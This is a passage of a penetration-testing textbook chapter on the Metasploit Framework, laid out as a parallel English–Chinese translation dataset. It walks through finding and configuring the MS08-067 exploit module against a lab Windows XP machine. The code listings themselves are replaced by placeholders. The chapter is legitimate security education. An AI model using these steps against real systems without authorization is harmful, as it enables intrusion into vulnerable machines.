- en: Chapter 4. Using the Metasploit Framework
  id: totrans-0
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 第4章 使用 Metasploit 框架
- en: In subsequent chapters, we’ll take an in-depth look at the phases of penetration
    testing, but in this chapter, we’ll dive right in and get some hands-on experience
    with exploitation. Though the information-gathering and reconnaissance phases
    often have more bearing on a pentest’s success than exploitation does, it’s more
    fun to gather shells (a remote connection to an exploited target) or trick users
    into entering their company credentials into your cloned website.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在后续章节中，我们将深入探讨渗透测试的各个阶段，但在本章中，我们将直接动手，亲自体验利用过程。尽管信息收集和侦察阶段对渗透测试的成功通常更为重要，但收集
    shell（连接到被利用的目标的远程连接）或诱使用户将其公司凭据输入到你的克隆网站中，总比利用漏洞更有趣。
- en: In this chapter we’ll work with the Metasploit Framework, a tool that has become
    the de facto standard for penetration testers. First released in 2003, Metasploit
    has reached cult status in the security community. Though Metasploit is now owned
    by the security company Rapid7, an open source edition is still available, with
    development largely driven by the security community.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将使用 Metasploit 框架，这是渗透测试人员的事实标准工具。Metasploit 于 2003 年首次发布，在安全社区中已成为一种文化现象。尽管
    Metasploit 目前由安全公司 Rapid7 拥有，但仍然提供开源版本，且开发工作主要由安全社区推动。
- en: Metasploit’s modular and flexible architecture helps developers efficiently
    create working exploits as new vulnerabilities are discovered. As you’ll see,
    Metasploit is intuitive and easy to use, and it offers a centralized way to run
    trusted exploit code that has been vetted for accuracy by the security community.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 的模块化和灵活架构帮助开发人员在发现新漏洞时高效地创建有效的利用代码。正如你将看到的，Metasploit 直观且易于使用，并且提供了一种集中化的方式来运行已经通过安全社区验证的可信利用代码。
- en: Why use Metasploit? Say you’ve discovered a vulnerability in your client environment—the
    Windows XP system at 192.168.20.10 is missing Microsoft security bulletin MS08-067\.
    As a penetration tester, it is up to you to exploit this vulnerability, if possible,
    and assess the risk of a compromise.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 为什么要使用 Metasploit？假设你在客户环境中发现了一个漏洞——位于 192.168.20.10 的 Windows XP 系统缺少 Microsoft
    安全公告 MS08-067。作为渗透测试人员，你需要利用这个漏洞（如果可能的话），并评估潜在的安全风险。
- en: One approach might be to set up in your lab a Windows XP system that is also
    missing this patch, attempt to trigger the vulnerability, and develop a working
    exploit. But developing exploits by hand takes both time and skill, and the window
    of opportunity for your pentest may be closing.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 一种方法可能是在你的实验室中设置一个同样缺少此补丁的 Windows XP 系统，尝试触发漏洞，并开发一个有效的利用代码。但手动开发利用代码既耗时又需要技能，而你的渗透测试机会窗口可能正在关闭。
- en: 'You could instead search for code that exploits this vulnerability on the Internet.
    Sites like Packet Storm Security (*[http://www.packetstormsecurity.com/](http://www.packetstormsecurity.com/)*),
    SecurityFocus (*[http://www.securityfocus.com/](http://www.securityfocus.com/)*),
    and Exploit Database (*[http://www.exploit-db.com/](http://www.exploit-db.com/)*)
    provide repositories of known exploit code. But be forewarned: Not all public
    exploit code does what it claims to do. Some exploit code may destroy the target
    system or even attack your system instead of the target. You should always be
    vigilant when running anything you find online and read through the code carefully
    before trusting it. Additionally, the public exploits you find may not meet your
    needs right out of the box. You may need to do some additional work to port them
    to your pentest environment.'
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以尝试在互联网上搜索利用此漏洞的代码。像 Packet Storm Security (*[http://www.packetstormsecurity.com/](http://www.packetstormsecurity.com/)*)、SecurityFocus
    (*[http://www.securityfocus.com/](http://www.securityfocus.com/)*)、和 Exploit Database
    (*[http://www.exploit-db.com/](http://www.exploit-db.com/)*) 这样的网站提供了已知利用代码的仓库。但需要警惕的是：并非所有公开的利用代码都能按其声明的方式工作。有些利用代码可能会摧毁目标系统，甚至攻击你的系统而不是目标。你在运行网上找到的任何东西时，应该始终保持警惕，并在信任之前仔细阅读代码。此外，你找到的公开利用代码可能无法完全满足你的需求。你可能需要做一些额外的工作，将它们移植到你的渗透测试环境中。
- en: Whether we develop an exploit from scratch or use a public one as a base, we
    will still need to get that exploit to work on your pentest. Our time will probably
    be better spent on tasks that are difficult to automate, and luckily, we can use
    Metasploit to make exploiting known vulnerabilities such as MS08-067 quick and
    painless.
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 无论我们是从零开始开发利用代码，还是将公开的代码作为基础，我们仍然需要让这个利用代码在你的渗透测试中生效。我们的时间可能会更好地用于那些难以自动化的任务，幸运的是，我们可以使用
    Metasploit 来快速且轻松地利用已知漏洞，如 MS08-067。
- en: Starting Metasploit
  id: totrans-8
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 启动 Metasploit
- en: Let’s start Metasploit and attack our first system. In Kali Linux, Meta sploit
    is in our path, so we can start it anywhere on the system. But before you start
    Metasploit, you will want to start the PostgreSQL database, which Metasploit will
    use to track what you do.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们启动 Metasploit 并攻击我们的第一个系统。在 Kali Linux 中，Metasploit 在我们的路径中，因此我们可以在系统中的任何位置启动它。但在启动
    Metasploit 之前，你需要启动 PostgreSQL 数据库，Metasploit 会使用它来跟踪你的操作。
- en: '[PRE0]'
  id: totrans-10
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Now you’re ready to start the Metasploit service. This command creates a PostgreSQL
    user called *msf3* and a corresponding database to store our data. It also starts
    Metasploit’s remote procedure call (RPC) server and web server.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 现在你已经准备好启动 Metasploit 服务。此命令会创建一个名为 *msf3* 的 PostgreSQL 用户，并创建一个相应的数据库来存储我们的数据。它还会启动
    Metasploit 的远程过程调用（RPC）服务器和 Web 服务器。
- en: '[PRE1]'
  id: totrans-12
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: There are multiple interfaces for using Metasploit. In this chapter we’ll use
    Msfconsole, the Metasploit text-based console, and Msfcli, the command line interface.
    Either interface can be used to run Metasploit modules, though I tend to spend
    most of my time in Msfconsole. Start the console by entering **`msfconsole`**.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 Metasploit 有多种接口。在本章中，我们将使用 Msfconsole，这是一个基于文本的 Metasploit 控制台，以及 Msfcli，这是一个命令行接口。两种接口都可以用来运行
    Metasploit 模块，尽管我通常会在 Msfconsole 中花费大部分时间。通过输入 **`msfconsole`** 来启动控制台。
- en: '[PRE2]'
  id: totrans-14
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: Don’t be alarmed if Msfconsole appears to hang for a minute or two; it’s loading
    the Metasploit module tree on the fly. Once it’s finished, you’ll be greeted by
    some clever ASCII art, a version listing and other details, and an `msf >` prompt
    (see [Example 4-1](ch04.xhtml#starting_msfconsole "Example 4-1. Starting Msfconsole")).
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 Msfconsole 看起来停顿了一两分钟，不要惊慌；它正在动态加载 Metasploit 模块树。加载完成后，你将看到一些巧妙的 ASCII 艺术、版本信息和其他细节，以及一个
    `msf >` 提示符（见 [示例 4-1](ch04.xhtml#starting_msfconsole "示例 4-1. 启动 Msfconsole")）。
- en: Example 4-1. Starting Msfconsole
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-1. 启动 Msfconsole
- en: '[PRE3]'
  id: totrans-17
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: Notice in [Example 4-1](ch04.xhtml#starting_msfconsole "Example 4-1. Starting
    Msfconsole") that, as of this writing, Metasploit had 1,246 exploits, 678 auxiliary
    modules, and so forth. No doubt by the time you read this, these numbers will
    be even larger. New modules are always being added to Metasploit, and because
    Metasploit is a community-driven project, anyone can submit modules for inclusion
    in the Metasploit Framework. (In fact, in [Chapter 19](ch19.xhtml "Chapter 19. Fuzzing,
    Porting Exploits, and Metasploit Modules"), you’ll learn how to write your own
    modules and gain immortality as a Metasploit author.)
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，在 [示例 4-1](ch04.xhtml#starting_msfconsole "示例 4-1. 启动 Msfconsole") 中，截至本文撰写时，Metasploit
    有 1,246 个漏洞利用模块、678 个辅助模块等。毫无疑问，当你阅读本文时，这些数字会更大。新的模块不断被添加到 Metasploit 中，并且由于 Metasploit
    是一个社区驱动的项目，任何人都可以提交模块以供加入 Metasploit 框架。（事实上，在 [第 19 章](ch19.xhtml "第 19 章. 模糊测试、漏洞移植和
    Metasploit 模块") 中，你将学习如何编写自己的模块，并作为 Metasploit 作者获得不朽的名声。）
- en: If you’re ever stuck when using Msfconsole, enter `help` for a list of available
    commands and a description of what they do. For more detailed information about
    a specific command, including usage, enter `help` *`<command name>`*.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在使用 Msfconsole 时遇到困难，可以输入 `help` 获取可用命令的列表以及它们的功能描述。对于某个特定命令的详细信息，包括用法，输入
    `help` *`<command name>`*。
- en: For example, the help information for using Metasploit’s `route` command is
    shown in [Example 4-2](ch04.xhtml#help_information_in_metasploit "Example 4-2. Help
    information in Metasploit").
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，使用 Metasploit 的 `route` 命令的帮助信息显示在 [示例 4-2](ch04.xhtml#help_information_in_metasploit
    "示例 4-2. Metasploit 中的帮助信息") 中。
- en: Example 4-2. Help information in Metasploit
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-2. Metasploit 中的帮助信息
- en: '[PRE4]'
  id: totrans-22
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: Finding Metasploit Modules
  id: totrans-23
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 查找 Metasploit 模块
- en: Let’s look at how we might use Metasploit to exploit an unpatched vulnerability
    in our Windows XP target. We will exploit the vulnerability patched in Microsoft
    Security Bulletin MS08-067\. A natural question you may have is, how do we know
    this patch is missing on our Windows XP target? In subsequent chapters, we will
    walk through the steps of discovering this vulnerability as well as several others
    on our target systems. For now, just trust me that this is the vulnerability we
    would like to exploit.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看如何利用 Metasploit 来利用我们 Windows XP 目标中的未修补漏洞。我们将利用在 Microsoft 安全公告 MS08-067
    中修补的漏洞。你可能会问一个自然的问题，那就是我们怎么知道这个补丁在我们的 Windows XP 目标系统中缺失？在后续章节中，我们将逐步介绍如何发现这个漏洞以及在目标系统上发现的其他几个漏洞。现在，只需相信我，这是我们希望利用的漏洞。
- en: MS08-067 patched an issue in the *netapi32.dll* that could allow attackers to
    use a specially crafted remote procedure call request via the Server Message Block
    (SMB) service to take over a target system. This vulnerability is particularly
    dangerous because it does not require an attacker to authenticate to the target
    machine before running the attack. MS08-067 gained eternal infamy as the vulnerability
    exploited by the Conficker worm, which was widely reported in the media.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: MS08-067修复了*netapi32.dll*中的一个问题，该问题允许攻击者通过服务器消息块（SMB）服务使用特殊构造的远程过程调用请求接管目标系统。这个漏洞特别危险，因为它不要求攻击者在执行攻击之前先对目标机器进行身份验证。MS08-067因被Conficker蠕虫利用而获得了永恒的恶名，这一事件在媒体上被广泛报道。
- en: Now, if you’re familiar with Microsoft patches, you may recognize that this
    one is from 2008\. Considering its age, you may be surprised to learn how often
    the vulnerability it patched can still lead to success in penetration testing,
    even today, particularly when assessing internal networks. Metasploit’s MS08-067
    module is simple to use and has a high success rate, making it an ideal first
    example. Our first step in using Metasploit is to find a module that exploits
    this particular vulnerability. We have a few options. Usually, a simple Google
    search will find what you need, but Metasploit also has an online database of
    modules (*[http://www.rapid7.com/db/modules/](http://www.rapid7.com/db/modules/)*)
    and a built-in search function that you can use to search for the correct modules.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，如果你熟悉Microsoft的补丁，可能会认出这个补丁是2008年的。考虑到它的年代，你可能会惊讶地发现，即使今天，特别是在评估内部网络时，这个补丁所修复的漏洞仍然能够在渗透测试中取得成功。Metasploit的MS08-067模块易于使用且成功率高，使其成为理想的第一个示例。我们使用Metasploit的第一步是找到一个能够利用这个特定漏洞的模块。我们有几个选择。通常，通过简单的Google搜索就能找到所需的模块，但Metasploit也有一个在线模块数据库（*[http://www.rapid7.com/db/modules/](http://www.rapid7.com/db/modules/)）以及一个内置的搜索功能，你可以用来搜索正确的模块。
- en: The Module Database
  id: totrans-27
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 模块数据库
- en: You can use the Metasploit search page to match Metasploit modules to -vulnerabilities
    by Common Vulnerabilities and Exposures (CVE) number, Open Sourced Vulnerability
    Database (OSVDB) ID, Bugtraq ID, or Microsoft Security Bulletin, or you can search
    the full text of the module information for a string. Search for *MS08-067* in
    the Microsoft Security Bulletin ID field, as shown in [Figure 4-1](ch04.xhtml#searching_the_metasploit_auxiliary_modul
    "Figure 4-1. Searching the Metasploit Auxiliary Module & Exploit Database").
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以使用Metasploit的搜索页面，根据公共漏洞和暴露（CVE）编号、开源漏洞数据库（OSVDB）ID、Bugtraq ID或Microsoft安全公告来匹配Metasploit模块与漏洞，或者你可以搜索模块信息的全文内容。可以在Microsoft安全公告ID字段中搜索*MS08-067*，如[图4-1](ch04.xhtml#searching_the_metasploit_auxiliary_modul
    "图4-1. 搜索Metasploit辅助模块与漏洞数据库")所示。
- en: '![Searching the Metasploit Auxiliary Module & Exploit Database](httpatomoreillycomsourcenostarchimages2030302.png.jpg)Figure 4-1. Searching
    the Metasploit Auxiliary Module & Exploit Database'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: '![搜索Metasploit辅助模块与漏洞数据库](httpatomoreillycomsourcenostarchimages2030302.png.jpg)图4-1.
    搜索Metasploit辅助模块与漏洞数据库'
- en: The results of the search, shown in [Figure 4-2](ch04.xhtml#ms08-067_metasploit_module_page
    "Figure 4-2. MS08-067 Metasploit module page"), tell us the module name we need
    as well as information about the module (which we’ll discuss in the next section).
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 搜索结果，如[图4-2](ch04.xhtml#ms08-067_metasploit_module_page "图4-2. MS08-067 Metasploit模块页面")所示，告诉我们需要的模块名称以及有关该模块的信息（我们将在下一节讨论）。
- en: '![MS08-067 Metasploit module page](httpatomoreillycomsourcenostarchimages2030304.png.jpg)Figure 4-2. MS08-067
    Metasploit module page'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '![MS08-067 Metasploit模块页面](httpatomoreillycomsourcenostarchimages2030304.png.jpg)图4-2.
    MS08-067 Metasploit模块页面'
- en: The full name of the Metasploit module for the MS08-067 security bulletin is
    shown in the URI bar. In the modules directory of Metasploit, this exploit is
    *exploit/windows/smb/ms08_067_netapi*.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: MS08-067安全公告的Metasploit模块的完整名称显示在URI栏中。在Metasploit的模块目录中，这个漏洞的利用模块是*exploit/windows/smb/ms08_067_netapi*。
- en: Built-In Search
  id: totrans-33
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 内置搜索
- en: You can also use Metasploit’s built-in search function to find the correct module
    name, as shown in [Example 4-3](ch04.xhtml#searching_for_a_metasploit_module "Example 4-3. Searching
    for a Metasploit module").
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 你也可以使用Metasploit的内置搜索功能来找到正确的模块名称，如[示例4-3](ch04.xhtml#searching_for_a_metasploit_module
    "示例4-3. 搜索Metasploit模块")所示。
- en: Example 4-3. Searching for a Metasploit module
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 示例4-3. 搜索Metasploit模块
- en: '[PRE5]'
  id: totrans-36
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: Again we find that the correct module name for this vulnerability is *exploit/windows/smb/ms08_067_netapi*.
    Once you’ve identified a module to use, enter the `info` command with the module
    name, as shown in [Example 4-4](ch04.xhtml#information_listing_in_metasploit "Example 4-4. Information
    listing in Metasploit").
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 我们再次发现，这个漏洞的正确模块名称是 *exploit/windows/smb/ms08_067_netapi*。一旦你确认了要使用的模块，输入 `info`
    命令并加上模块名称，如 [示例 4-4](ch04.xhtml#information_listing_in_metasploit "示例 4-4。Metasploit
    中的信息列出") 中所示。
- en: Example 4-4. Information listing in Metasploit
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-4。Metasploit 中的信息列出
- en: '[PRE6]'
  id: totrans-39
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: This info page tells us a lot.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 这个信息页面告诉我们很多内容。
- en: First we see some basic information about the module, including a descriptive
    name at ❶ followed by the module name at ❷. (The version field formerly denoted
    the SVN revision for the module, but now that Metasploit is hosted on GitHub,
    all modules are set to version 0.)
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 首先我们看到一些关于模块的基本信息，包括 ❶ 处的描述性名称，接着是 ❷ 处的模块名称。（版本字段以前表示模块的 SVN 修订版，但由于 Metasploit
    现在托管在 GitHub 上，所有模块的版本都设置为 0。）
- en: '**`Platform`** ❸ tells us that this exploit is for Windows systems.'
  id: totrans-42
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**`平台`** ❸ 告诉我们这个利用适用于 Windows 系统。'
- en: '**`Privileged`** ❹ tells us whether this module requires or grants high privileges
    on the target. The `License` is set to Metasploit Framework License (BSD). (Metasploit’s
    license is a three-clause BSD open source license.)'
  id: totrans-43
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**`权限`** ❹ 告诉我们该模块是否需要或授予目标系统的高级权限。`许可证` 被设置为 Metasploit Framework 许可证（BSD）。（Metasploit
    的许可证是一个三条款的 BSD 开源许可证。）'
- en: '**`Rank`** ❺ lists the exploit’s potential impact on the target. Exploits are
    ranked from manual to excellent. An exploit ranked excellent should never crash
    a service; memory-corruption vulnerabilities such as MS08-067 are usually not
    in this category. Our module is in the great category, one step down. A great
    exploit can automatically detect the correct target and has other features that
    make it more likely to succeed.'
  id: totrans-44
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**`排名`** ❺ 列出了该利用对目标的潜在影响。利用根据从手动到优秀进行排名。一个排名为优秀的利用不应该导致服务崩溃；像 MS08-067 这样的内存损坏漏洞通常不在这个类别中。我们的模块属于“优秀”类别的下一个级别。“优秀”级别的利用可以自动检测正确的目标，并具有其他特性，使其更可能成功。'
- en: '**`Available targets`** ❻ lists operating system versions and patch levels
    that the module can exploit. This module has 67 possible targets, including Windows
    2000, Windows 2003, and Windows XP, as well as multiple service and language packs.'
  id: totrans-45
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**`可用目标`** ❻ 列出了该模块可以利用的操作系统版本和补丁级别。这个模块有 67 个可能的目标，包括 Windows 2000、Windows
    2003 和 Windows XP，以及多个服务和语言包。'
- en: '**`Basic options`** ❼ lists various options for the module that can be set
    to make a module better meet our needs. For example, the `RHOST` option tells
    Metasploit the IP address of the target. (We’ll discuss the basic options in depth
    in [Setting Module Options](ch04.xhtml#setting_module_options "Setting Module
    Options").)'
  id: totrans-46
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**`基本选项`** ❼ 列出了模块的各种选项，可以设置以使模块更好地满足我们的需求。例如，`RHOST` 选项告诉 Metasploit 目标的 IP
    地址。（我们将在[设置模块选项](ch04.xhtml#setting_module_options "设置模块选项")中深入讨论这些基本选项。）'
- en: '**`Payload information`** ❽ contains information to help Metasploit decide
    which payloads it can use with this exploit. Payloads, or shellcode, tell the
    exploited system what to do on behalf of the attacker. (The goal of attacking
    a target is, of course, to get it to do something on our behalf that it isn’t
    supposed to do.) Metasploit’s payload system gives us many options for what to
    make the target do.'
  id: totrans-47
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**`有效载荷信息`** ❽ 包含帮助 Metasploit 决定可以与此利用一起使用哪些有效载荷的信息。有效载荷或 shellcode 告诉被利用的系统代表攻击者执行什么操作。（攻击目标的目的是，当然是让它做一些它本不该做的事情。）Metasploit
    的有效载荷系统为我们提供了许多让目标执行操作的选项。'
- en: '**`Description`** ❾ includes more details about the particular vulnerability
    that the module exploits.'
  id: totrans-48
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**`描述`** ❾ 包括有关该模块利用的特定漏洞的更多详细信息。'
- en: '**`References`** ❿ contains a link to online vulnerability database entries.
    If you’re ever in doubt about which Metasploit module to use for a vulnerability,
    start with its info page.'
  id: totrans-49
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**`参考资料`** ❿ 包含指向在线漏洞数据库条目的链接。如果你在选择用于某个漏洞的 Metasploit 模块时感到困惑，可以从其信息页面开始。'
- en: Having confirmed that this is the right module, tell Metasploit to use this
    module with the command **`use windows/smb/ms08_067_netapi`**. You can drop the
    *exploit/* part of the exploit name; Metasploit will figure out what you want.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 确认这是正确的模块后，告诉 Metasploit 使用此模块，命令为 **`use windows/smb/ms08_067_netapi`**。你可以省略
    *exploit/* 部分的模块名称；Metasploit 会自动识别你想要的。
- en: '[PRE7]'
  id: totrans-51
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: Now we’re in the context of the exploit module.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们处于利用模块的上下文中。
- en: Setting Module Options
  id: totrans-53
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 设置模块选项
- en: Having chosen our exploit, we need to give Metasploit some information. As you’ll
    see throughout this book, Metasploit can aid you in many aspects of penetration
    testing, but it isn’t a mind reader . . . yet. To see the information Metasploit
    needs from you to run your chosen module, enter **`show options`** ([Example 4-5](ch04.xhtml#exploit_module_options
    "Example 4-5. Exploit module options")).
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 选择了我们的利用方法后，我们需要向 Metasploit 提供一些信息。正如你将在本书中看到的那样，Metasploit 可以在渗透测试的许多方面为你提供帮助，但它还不是一个能够读心的工具……至少目前还不是。要查看
    Metasploit 运行你所选择的模块所需的信息，请输入 **`show options`**（[示例 4-5](ch04.xhtml#exploit_module_options
    "示例 4-5：利用模块选项")）。
- en: Example 4-5. Exploit module options
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-5. 利用模块选项
- en: '[PRE8]'
  id: totrans-56
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: At the top of the output shown in [Example 4-5](ch04.xhtml#exploit_module_options
    "Example 4-5. Exploit module options") are the module settings and any default
    values, whether certain settings are required for the module to run successfully,
    and a description of each setting.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 在[示例 4-5](ch04.xhtml#exploit_module_options "示例 4-5：利用模块选项")中显示的输出顶部是模块设置以及任何默认值，是否某些设置是模块成功运行所必需的，以及每个设置的描述。
- en: RHOST
  id: totrans-58
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: RHOST
- en: The `RHOST` option ❶ refers to the remote host we want to exploit. This option
    is required because it gives Metasploit a target to attack. We’ll tell Metasploit
    to exploit the Windows XP target machine that we set up in [Chapter 1](ch01.xhtml
    "Chapter 1. Setting Up Your Virtual Lab") by changing the `RHOST` option from
    blank to our target IP address. (If you can’t remember what that is, on the Windows
    XP machine run `ipconfig` at the command line to find out.) To set an option enter
    `set` *`<option to set> <value to set it to>`*, so in this case, **`set RHOST
    192.168.20.10`**. (Remember to use your own Windows XP target’s IP address.) After
    issuing this command, running `show options` again should show that the value
    of `RHOST` is set to 192.168.20.10.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: '`RHOST` 选项 ❶ 指的是我们想要利用的远程主机。这个选项是必需的，因为它给 Metasploit 提供了一个攻击目标。我们将通过将 `RHOST`
    选项从空白更改为我们的目标 IP 地址，告诉 Metasploit 利用我们在[第 1 章](ch01.xhtml "第 1 章：设置你的虚拟实验室")中设置的
    Windows XP 目标机。（如果你记不住目标 IP 地址是什么，可以在 Windows XP 机器上运行 `ipconfig` 命令来查找。）要设置一个选项，请输入
    `set` *`<要设置的选项> <要设置的值>`*，所以在这种情况下，**`set RHOST 192.168.20.10`**。（记得使用你自己 Windows
    XP 目标机的 IP 地址。）发出此命令后，再次运行 `show options` 应该会显示 `RHOST` 的值已设置为 192.168.20.10。'
- en: RPORT
  id: totrans-60
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: RPORT
- en: '`RPORT` ❷ refers to the remote port to attack. I remember a former manager
    of mine who spent a good amount of time looking for port 80—as in trying to locate
    it physically. Unsatisfied with my explanation that networking sockets are made
    entirely of code, I eventually just pointed at the Ethernet port. The moral of
    this story is this: A port is just a network socket; it’s not a physical port.
    For example, when you browse to *[www.google.com](http://www.google.com)*, a web
    server somewhere on the Internet is listening on port 80.'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: '`RPORT` ❷ 指的是远程端口。让我想起了一位曾经的经理，他花了很长时间寻找 80 端口——就像是试图物理地找到它一样。对于我解释说网络端口完全是由代码构成的他并不满意，最终我只是指着以太网端口。这个故事的寓意是：端口只是网络端口；它并不是一个物理端口。例如，当你浏览
    *[www.google.com](http://www.google.com)* 时，互联网上的某个 web 服务器就在 80 端口上监听。'
- en: In this case we see that `RPORT` is set to a default value. Because our exploit
    uses the Windows SMB service, the `RPORT` value should probably be 445, the default
    port for SMB. And, as you can see, Metasploit saves us the trouble of having to
    set the value by setting the default to 445 (which you can change if you need
    to). In our case, we can just leave it alone.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们看到 `RPORT` 被设置为默认值。因为我们的利用方法使用了 Windows SMB 服务，`RPORT` 的值可能应该是 445，这是
    SMB 的默认端口。正如你所看到的，Metasploit 为我们节省了设置该值的麻烦，默认将其设置为 445（如果需要，你可以更改它）。在我们的案例中，我们可以直接保持这个设置。
- en: SMBPIPE
  id: totrans-63
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: SMBPIPE
- en: Like the `RPORT` value, keep the default for the `SMBPIPE` option ❸ as `BROWSER`.
    This will work just fine for our purposes. (SMB pipes allow us to talk to Windows
    interprocess communication over a network. We’ll look at finding out which SMB
    pipes are listening on our target machines later in this chapter.)
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 和 `RPORT` 值一样，对于 `SMBPIPE` 选项 ❸，保持默认值 `BROWSER` 即可。这对我们的目的来说完全足够。（SMB 管道允许我们通过网络与
    Windows 的进程间通信进行交互。我们将在本章稍后部分探讨如何找出目标机器上监听的 SMB 管道。）
- en: Exploit Target
  id: totrans-65
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 利用目标
- en: The Exploit Target is set to `0 Automatic Targeting` ❹. This is the target operating
    system and version. You can view the available targets on the module’s info page
    or just show them with the command `show targets` ([Example 4-6](ch04.xhtml#exploit_targets
    "Example 4-6. Exploit targets")).
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 利用目标设置为`0 自动目标选择` ❹。这是目标操作系统及其版本。你可以在模块的信息页面查看可用的目标，或者通过命令`show targets`显示它们（参见[示例
    4-6](ch04.xhtml#exploit_targets "示例 4-6. 利用目标")）。
- en: Example 4-6. Exploit targets
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-6. 利用目标
- en: '[PRE9]'
  id: totrans-68
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: As you can see in [Example 4-6](ch04.xhtml#exploit_targets "Example 4-6. Exploit
    targets"), this module can attack Windows 2000, Windows 2003, and Windows XP.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 正如在[示例 4-6](ch04.xhtml#exploit_targets "示例 4-6. 利用目标")中所见，这个模块可以攻击 Windows 2000、Windows
    2003 和 Windows XP。
- en: Note
  id: totrans-70
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Remember, Microsoft has released patches for all the platforms affected by this
    bug, but keeping all systems in an environment up-to-date with Windows patches
    is easier said than done. Many of your pentesting clients will be missing some
    critical updates in Windows and other software.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，微软已经为所有受此漏洞影响的平台发布了补丁，但要保持环境中的所有系统都及时安装 Windows 补丁并非易事。许多渗透测试客户的 Windows
    系统及其他软件将会缺少一些关键更新。
- en: We know that our target is running Windows XP SP3 English, so we can wager that
    the correct target number is either 5 or 6, but it won’t always be so easy. Choose
    `Automatic Targeting` to tell Metasploit to fingerprint the SMB service and choose
    the appropriate target based on the results.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 我们知道我们的目标是运行 Windows XP SP3 英文版，因此我们可以猜测正确的目标编号是 5 或 6，但这并不总是这么简单。选择`自动目标选择`，让
    Metasploit 指纹识别 SMB 服务，并根据结果选择适当的目标。
- en: To set a target option, enter `set target` *`<target number>`*. In this case
    we’ll leave the module target at the default `Automatic Targeting` and move on.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 要设置目标选项，请输入`set target` *`<target number>`*。在这种情况下，我们将模块的目标保持为默认的`自动目标选择`，然后继续。
- en: Payloads (or Shellcode)
  id: totrans-74
